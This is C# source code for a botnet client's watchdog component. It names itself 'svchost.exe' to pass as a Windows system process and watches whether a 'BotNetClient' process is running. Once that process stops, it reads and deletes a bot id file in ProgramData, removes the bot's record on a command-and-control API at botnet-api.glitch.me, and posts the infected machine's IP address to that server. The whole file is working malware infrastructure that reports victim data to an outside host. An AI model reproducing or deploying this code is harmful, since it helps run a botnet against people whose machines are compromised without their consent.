using System.Linq;
using System.Diagnostics;
using System.IO;
using System;
using System.Net.Http;
using System.Net;
using System.Threading.Tasks;
using System.Threading;
using System.Web.Script.Serialization;

namespace svchost.exe
{
    public class Response
    {
        public string ip { get; set; }
        public string response { get; set; }
    }
    class Program
    {
        static async Task SendAsync(string Ip)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
            Response response = new Response
            {
                ip = Ip,
                response = Ip + "    Disconneted"
            };
            string json = new JavaScriptSerializer().Serialize(response);
            await client.PostAsync($"/api/v1/responses/{Ip}", new StringContent(json));
        }
        static async Task Delete(uint id)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
            await client.DeleteAsync($"/api/v1/ip/{id}");
        }
        static void Main(string[] args)
        {
            IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
            IPAddress ipaddress = iphostinfo.AddressList[0];
            String pth = "System.Diagnostics.Process (BotNetClient)";
            Thread.Sleep(1000);
            string id;
            var processes = Process.GetProcesses();
            string[] proc = new string[processes.Length];
            for (int i = 0; i < processes.Length; i++)
            {
                proc[i] = processes[i].ToString();
            }
            while (true)
            {
                if (Array.IndexOf(proc,pth)>=0)
                {
                    Array.Clear(processes, 0, processes.Length);
                    processes = Process.GetProcesses();
                    Array.Clear(proc,0,proc.Length);
                    proc = new string[processes.Length];
                    for (int i = 0; i < processes.Length; i++)
                    {
                        proc[i] = processes[i].ToString();
                    }
                    continue;
                }
                else
                {
                    id = File.ReadAllText("C:\\ProgramData\\idbtc.txt");
                    File.Delete("C:\\ProgramData\\idbtc.txt");
                    Delete(Convert.ToUInt32(id)).Wait();
                    SendAsync(ipaddress.ToString()).Wait();
                    break;
                }
            }
        }
    }
}
